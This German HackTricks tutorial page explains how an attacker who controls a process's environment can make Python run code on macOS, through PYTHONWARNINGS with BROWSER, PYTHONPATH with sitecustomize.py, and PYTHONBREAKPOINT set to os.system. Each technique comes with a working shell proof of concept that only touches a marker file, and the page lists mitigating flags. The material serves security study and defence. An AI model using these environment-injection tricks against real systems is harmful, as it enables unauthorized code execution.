# Python-Anwendungsinjection unter macOS

{{#include ../../../banners/hacktricks-training.md}}

## Über die Umgebungsvariablen `PYTHONWARNINGS` und `BROWSER`

Wenn ein Angreifer die Umgebung eines Python-Prozesses kontrollieren kann, kann die Kombination aus `PYTHONWARNINGS` und `BROWSER` die Befehlsausführung auslösen, wenn Python beim Verarbeiten einer manipulierten Warnoption das Modul `antigravity` importiert. Die Technik beruht darauf, dass `antigravity` eine URL mit Pythons `webbrowser`-Modul öffnet, das die Umgebungsvariable `BROWSER` berücksichtigt.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Über `PYTHONPATH` und `sitecustomize.py`

Beim normalen Start fügt das Python-Modul `site` sitespezifische Pfade hinzu und versucht anschließend, ein Modul namens `sitecustomize` zu importieren. Indem ein für den Angreifer lesbares Verzeichnis an die erste Stelle in `PYTHONPATH` gesetzt wird, kann ein Angreifer, der die Prozessumgebung kontrolliert, Python dazu bringen, vor dem Zielskript einen Payload zu importieren. Das Flag `-S` deaktiviert die automatische Initialisierung von `site`, während der isolierte Modus (`-I`) `PYTHONPATH` ignoriert und implizit `-s` sowie `-E` aktiviert.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## Über `PYTHONBREAKPOINT`

Seit Python 3.7 (PEP 553) importiert der integrierte Aufruf `breakpoint()` den Wert, auf den `sys.breakpointhook` verweist, und ruft ihn auf. Dieses Ziel wird aus der Umgebungsvariable **`PYTHONBREAKPOINT`** (`package.module.callable`) übernommen. Sowohl das Importieren des benannten Moduls als auch der Aufruf des Callables werden ausgeführt, bevor der Debugger normalerweise erscheint. Ein Angreifer, der die Umgebung eines Prozesses kontrolliert, der einen `breakpoint()` erreicht (häufig in Wartungs-/Debug-Skripten und manchmal in Produktionspfaden), erhält dadurch Codeausführung.<sup>[[4]](#references)</sup>
```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```
Im Gegensatz zu `PYTHONWARNINGS`/`PYTHONPATH` muss das Ziel hierbei tatsächlich einen Aufruf von `breakpoint()` erreichen. Es funktioniert jedoch auch ausschließlich über die **Import-Nebeneffekte** des angegebenen Moduls (verweise auf ein beliebiges importierbares Modul – beispielsweise eines, das an erster Stelle in `PYTHONPATH` liegt – dessen Top-Level-Code ausgeführt wird). Das Setzen von `PYTHONBREAKPOINT=0` deaktiviert den Hook vollständig.

## References

- [1] [Hacking mit Umgebungsvariablen - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Site-spezifischer Konfigurations-Hook](https://docs.python.org/3/library/site.html)
- [3] [Python-Kommandozeile und Umgebung](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — Integrierter breakpoint() und PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
{{#include ../../../banners/hacktricks-training.md}}
